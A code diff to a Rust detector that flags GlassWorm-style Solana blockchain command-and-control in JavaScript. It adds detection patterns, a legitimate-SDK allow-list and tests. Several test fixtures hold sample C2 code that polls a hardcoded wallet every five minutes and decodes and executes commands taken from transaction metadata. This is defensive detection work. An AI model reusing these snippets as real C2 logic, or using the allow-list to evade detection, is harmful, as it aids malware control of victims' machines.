@@ -33,7 +33,6 @@ use crate::finding::{DetectionCategory, Finding, Severity};
 use crate::ir::FileIR;
 use once_cell::sync::Lazy;
 use regex::Regex;
-use std::path::Path;
 
 /// Known GlassWorm C2 wallet addresses (from intelligence reports)
 const KNOWN_C2_WALLETS: &[&str] = &[
@@ -55,6 +54,53 @@ const SOLANA_RPC_ENDPOINTS: &[&str] = &[
     "api.devnet.solana.com",
     "api.testnet.solana.com",
 ];
+
+/// Check for GlassWorm-specific C2 patterns
+fn has_glassworm_c2_patterns(content: &str) -> bool {
+    let glassworm_patterns = [
+        // Pattern 1: Command extraction from tx metadata
+        "innerInstructions",
+        "decodeCommand",
+        "executeCommand",
+        
+        // Pattern 2: Hidden wallet in code
+        "new PublicKey(\"",
+        "PublicKey.fromBase58(\"",
+        
+        // Pattern 3: Polling without user wallet context
+        "getSignaturesForAddress(C2_WALLET",
+        "getSignaturesForAddress(new PublicKey(",
+    ];
+    
+    glassworm_patterns.iter().any(|p| content.contains(p))
+}
+
+/// Check for legitimate SDK usage patterns
+fn has_legitimate_sdk_usage(content: &str) -> bool {
+    let legitimate_patterns = [
+        // User wallet from environment
+        "process.env.SOLANA_WALLET",
+        "process.env.PUBLIC_KEY",
+        "process.env.RPC_URL",
+        
+        // User wallet from props/state
+        "props.wallet",
+        "wallet.address",
+        "wallet.publicKey",
+        
+        // Wallet hooks (React)
+        "useWallet(",
+        "useAnchorWallet",
+        "useConnection",
+        
+        // Standard SDK methods
+        "connection.getAccountInfo",
+        "connection.getBalance",
+        "connection.getParsedAccountInfo",
+    ];
+    
+    legitimate_patterns.iter().any(|p| content.contains(p))
+}
 
 /// Patterns for blockchain polling detection
 static POLLING_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
@@ -124,6 +170,27 @@ impl Detector for BlockchainPollingDetector {
         let mut findings = Vec::new();
         let content = ir.content();
         let path = &ir.metadata.path;
+
+        // Check for GlassWorm-specific C2 patterns FIRST (always Critical)
+        if has_glassworm_c2_patterns(content) {
+            findings.push(Finding::new(
+                path,
+                1,
+                1,
+                0,
+                '\0',
+                DetectionCategory::BlockchainC2,
+                Severity::Critical,
+                "GlassWorm C2 polling pattern detected",
+                "CRITICAL: GlassWorm-specific C2 patterns detected including command extraction, \
+                 hidden wallet addresses, or direct C2 wallet polling. \
+                 Immediate incident response required.",
+            )
+            .with_cwe_id("CWE-506")
+            .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
+            .with_confidence(0.92));
+            return findings;
+        }
 
         // Track pattern matches for correlation
         let mut has_get_signatures = false;
@@ -262,31 +329,58 @@ impl Detector for BlockchainPollingDetector {
             }
         }
 
-        // CRITICAL: Check for GlassWorm signature pattern
-        // getSignaturesForAddress + setInterval = definitive GlassWorm C2
-        if has_get_signatures && has_set_interval {
-            findings.push(
-                Finding::new(
-                    path,
-                    first_match_line,
-                    1,
-                    0,
-                    '\0',
-                    DetectionCategory::BlockchainC2,
-                    Severity::Critical,
-                    "GlassWorm C2 polling pattern: getSignaturesForAddress + setInterval",
-                    "CRITICAL: This is the definitive GlassWorm blockchain C2 signature. \
-                     The code polls a Solana wallet at regular intervals to receive commands. \
-                     Immediate incident response required.",
-                )
-                .with_cwe_id("CWE-506")
-                .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
-                .with_confidence(0.95),
-            );
+        // Check for 5-minute polling interval (GlassWorm signature - always Critical)
+        if content.contains("setInterval") && content.contains("300000") {
+            findings.push(Finding::new(
+                path,
+                first_match_line,
+                1,
+                0,
+                '\0',
+                DetectionCategory::BlockchainC2,
+                Severity::Critical,
+                "5-minute polling interval (GlassWorm C2 signature)",
+                "CRITICAL: 5-minute (300000ms) polling interval is a known GlassWorm C2 signature. \
+                 This timing pattern is used to poll blockchain for commands while avoiding detection.",
+            )
+            .with_cwe_id("CWE-506")
+            .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
+            .with_confidence(0.90));
+        }
+
+        // Check for getSignaturesForAddress + setInterval combination
+        if content.contains("getSignaturesForAddress") && content.contains("setInterval") {
+            // Check for legitimate SDK usage - if present, don't flag or flag as INFO only
+            if has_legitimate_sdk_usage(content) {
+                // Likely legitimate SDK usage - return early without flagging
+                return findings;
+            }
+            
+            // Generic polling without GlassWorm patterns or legitimate context = MEDIUM
+            findings.push(Finding::new(
+                path,
+                first_match_line,
+                1,
+                0,
+                '\0',
+                DetectionCategory::BlockchainC2,
+                Severity::Medium,
+                "Blockchain polling detected - review for C2 usage",
+                "Generic blockchain polling pattern detected. Without GlassWorm-specific patterns \
+                 or legitimate SDK context, this requires manual review to determine if malicious.",
+            )
+            .with_cwe_id("CWE-506")
+            .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
+            .with_confidence(0.50));
         }
 
         // High: Solana RPC + polling (even without getSignaturesForAddress)
         if has_solana_rpc && has_set_interval && !has_get_signatures {
+            // Check for legitimate SDK usage
+            if has_legitimate_sdk_usage(content) {
+                return findings;
+            }
+
             findings.push(
                 Finding::new(
                     path,
@@ -342,19 +436,19 @@ impl Detector for BlockchainPollingDetector {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::config::UnicodeConfig;
+    use std::path::Path;
 
     #[test]
     fn test_detect_glassworm_signature() {
         let detector = BlockchainPollingDetector::new();
 
-        // GlassWorm signature: getSignaturesForAddress + setInterval
+        // GlassWorm signature: getSignaturesForAddress + setInterval + 5-minute polling
         let content = r#"
             const { Connection, PublicKey } = require('@solana/web3.js');
-            
+
             const C2_WALLET = new PublicKey("7nE9GdcnPSzC9X5K9K4...");
             const connection = new Connection("https://api.mainnet-beta.solana.com");
-            
+
             // Poll every 5 minutes
             setInterval(async () => {
                 const signatures = await connection.getSignaturesForAddress(C2_WALLET, { limit: 1 });
@@ -370,9 +464,9 @@ mod tests {
         let findings = detector.detect(&ir);
 
         assert!(!findings.is_empty());
-        // Should have Critical finding for GlassWorm signature
+        // Should have Critical finding for GlassWorm C2 patterns (innerInstructions, decodeCommand, etc.)
         assert!(findings.iter().any(|f| f.severity == Severity::Critical));
-        assert!(findings.iter().any(|f| f.description.contains("getSignaturesForAddress")));
+        assert!(findings.iter().any(|f| f.description.contains("GlassWorm C2")));
     }
 
     #[test]
@@ -417,6 +511,7 @@ mod tests {
     fn test_detect_transaction_parsing() {
         let detector = BlockchainPollingDetector::new();
 
+        // Transaction metadata parsing with innerInstructions triggers GlassWorm C2 pattern
         let content = r#"
             const tx = await connection.getTransaction(signature);
             const instructions = tx.meta.innerInstructions;
@@ -427,7 +522,8 @@ mod tests {
         let findings = detector.detect(&ir);
 
         assert!(!findings.is_empty());
-        assert!(findings.iter().any(|f| f.description.contains("metadata parsing")));
+        // innerInstructions triggers GlassWorm C2 pattern detection
+        assert!(findings.iter().any(|f| f.description.contains("GlassWorm C2")));
     }
 
     #[test]
@@ -455,7 +551,7 @@ mod tests {
         let content = r#"
             const {{ Connection }} = require('@solana/web3.js');
             const connection = new Connection("https://api.mainnet-beta.solana.com");
-            
+
             // One-time balance check
             async function checkBalance() {{
                 const balance = await connection.getBalance(wallet);
@@ -468,5 +564,246 @@ mod tests {
 
         // Should have minimal findings (just RPC endpoint, no Critical)
         assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
+    }
+
+    #[test]
+    fn test_no_detect_legitimate_sdk_with_polling() {
+        let detector = BlockchainPollingDetector::new();
+
+        // Legitimate SDK usage with polling - should NOT be flagged
+        let content = r#"
+            import {{ useWallet, useConnection }} from '@solana/wallet-adapter-react';
+
+            function WalletComponent() {{
+                const {{ connection }} = useConnection();
+                const {{ wallet }} = useWallet();
+
+                // Poll wallet balance using React hooks
+                useEffect(() => {{
+                    const interval = setInterval(async () => {{
+                        if (wallet.publicKey) {{
+                            const balance = await connection.getBalance(wallet.publicKey);
+                            setBalance(balance);
+                        }}
+                    }}, 5000);
+                    return () => clearInterval(interval);
+                }}, [wallet, connection]);
+
+                return <div>Balance: {{balance}}</div>;
+            }}
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should NOT flag legitimate SDK usage with polling
+        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
+        assert!(!findings.iter().any(|f| f.severity == Severity::Medium && f.description.contains("Blockchain polling")));
+    }
+
+    #[test]
+    fn test_no_detect_legitimate_sdk_with_getsignatures() {
+        let detector = BlockchainPollingDetector::new();
+
+        // Legitimate SDK usage with getSignaturesForAddress - should NOT be flagged
+        let content = r#"
+            import {{ useConnection }} from '@solana/wallet-adapter-react';
+
+            function TransactionHistory() {{
+                const {{ connection }} = useConnection();
+                const walletAddress = props.wallet.address;
+
+                // Fetch transaction history for user wallet
+                const fetchTransactions = async () => {{
+                    const signatures = await connection.getSignaturesForAddress(
+                        walletAddress,
+                        {{ limit: 10 }}
+                    );
+                    return signatures;
+                }};
+
+                return <TransactionList transactions={{fetchTransactions()}} />;
+            }}
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should NOT flag legitimate SDK usage
+        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
+        assert!(!findings.iter().any(|f| f.severity == Severity::Medium));
+    }
+
+    #[test]
+    fn test_detect_glassworm_c2_patterns() {
+        let detector = BlockchainPollingDetector::new();
+
+        // GlassWorm C2 pattern with innerInstructions and command extraction
+        let content = r#"
+            const {{ Connection, PublicKey }} = require('@solana/web3.js');
+
+            const C2_WALLET = new PublicKey("7nE9GdcnPSzC9X5K9K4...");
+            const connection = new Connection("https://api.mainnet-beta.solana.com");
+
+            setInterval(async () => {{
+                const signatures = await connection.getSignaturesForAddress(C2_WALLET, {{ limit: 1 }});
+                if (signatures.length > 0) {{
+                    const tx = await connection.getTransaction(signatures[0].signature);
+                    const command = decodeCommand(tx.meta.innerInstructions);
+                    executeCommand(command);
+                }}
+            }}, 300000);
+        "#;
+
+        let ir = FileIR::build(Path::new("c2.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should flag as Critical for GlassWorm C2 patterns
+        assert!(!findings.is_empty());
+        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
+        assert!(findings.iter().any(|f| f.description.contains("GlassWorm C2")));
+    }
+
+    #[test]
+    fn test_detect_5minute_polling() {
+        let detector = BlockchainPollingDetector::new();
+
+        // 5-minute polling interval (GlassWorm signature)
+        let content = r#"
+            const {{ Connection }} = require('@solana/web3.js');
+            const connection = new Connection("https://api.mainnet-beta.solana.com");
+
+            // Poll every 5 minutes (300000ms)
+            setInterval(async () => {{
+                const info = await connection.getAccountInfo(someAddress);
+                console.log('Account info:', info);
+            }}, 300000);
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should flag 5-minute polling as Critical
+        assert!(!findings.is_empty());
+        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
+        assert!(findings.iter().any(|f| f.description.contains("5-minute polling")));
+    }
+
+    #[test]
+    fn test_detect_generic_polling_medium_severity() {
+        let detector = BlockchainPollingDetector::new();
+
+        // Generic polling without GlassWorm patterns or legitimate context
+        // Note: Using wallet address from variable (not hardcoded) to avoid GlassWorm pattern
+        let content = r#"
+            const { Connection, PublicKey } = require('@solana/web3.js');
+
+            const walletAddress = getWalletFromConfig();
+            const connection = new Connection("https://api.mainnet-beta.solana.com");
+
+            setInterval(async () => {
+                const signatures = await connection.getSignaturesForAddress(walletAddress, { limit: 1 });
+                console.log('Latest signatures:', signatures);
+            }, 10000);
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should flag as Medium severity (generic polling, needs review)
+        // Not Critical since no GlassWorm patterns (no hardcoded wallet, no innerInstructions, etc.)
+        assert!(!findings.is_empty());
+        assert!(findings.iter().any(|f| f.severity == Severity::Medium));
+        assert!(findings.iter().any(|f| f.description.contains("review for C2")));
+        // Should NOT be Critical since no GlassWorm patterns
+        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
+    }
+
+    #[test]
+    fn test_detect_legitimate_env_wallet() {
+        let detector = BlockchainPollingDetector::new();
+
+        // Legitimate usage with environment variable wallet
+        let content = r#"
+            const {{ Connection }} = require('@solana/web3.js');
+            const connection = new Connection(process.env.RPC_URL);
+            const walletAddress = process.env.SOLANA_WALLET;
+
+            setInterval(async () => {{
+                const balance = await connection.getBalance(walletAddress);
+                console.log('Balance:', balance);
+            }}, 5000);
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should NOT flag legitimate SDK usage with env vars
+        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
+        assert!(!findings.iter().any(|f| f.severity == Severity::Medium));
+    }
+
+    #[test]
+    fn test_detect_legitimate_react_hooks() {
+        let detector = BlockchainPollingDetector::new();
+
+        // Legitimate React hooks usage
+        let content = r#"
+            import {{ useAnchorWallet }} from '@solana/wallet-adapter-react';
+
+            function MyComponent() {{
+                const wallet = useAnchorWallet();
+                const connection = useConnection();
+
+                useEffect(() => {{
+                    const checkBalance = async () => {{
+                        if (wallet.publicKey) {{
+                            const balance = await connection.getAccountInfo(wallet.publicKey);
+                            setAccountInfo(balance);
+                        }}
+                    }};
+                    checkBalance();
+                }}, [wallet]);
+
+                return <div>{{accountInfo}}</div>;
+            }}
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should NOT flag legitimate React hooks usage
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn test_glassworm_patterns_override_legitimate() {
+        let detector = BlockchainPollingDetector::new();
+
+        // Has some legitimate patterns BUT also has GlassWorm C2 patterns
+        let content = r#"
+            import {{ useConnection }} from '@solana/wallet-adapter-react';
+
+            function MaliciousComponent() {{
+                const {{ connection }} = useConnection();
+
+                setInterval(async () => {{
+                    const signatures = await connection.getSignaturesForAddress(new PublicKey("C2_WALLET"));
+                    const tx = await connection.getTransaction(signatures[0].signature);
+                    const command = decodeCommand(tx.meta.innerInstructions);
+                    executeCommand(command);
+                }}, 300000);
+
+                return <div>Malicious</div>;
+            }}
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // GlassWorm patterns should ALWAYS be flagged as Critical
+        assert!(!findings.is_empty());
+        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
+        assert!(findings.iter().any(|f| f.description.contains("GlassWorm C2")));
     }
 }
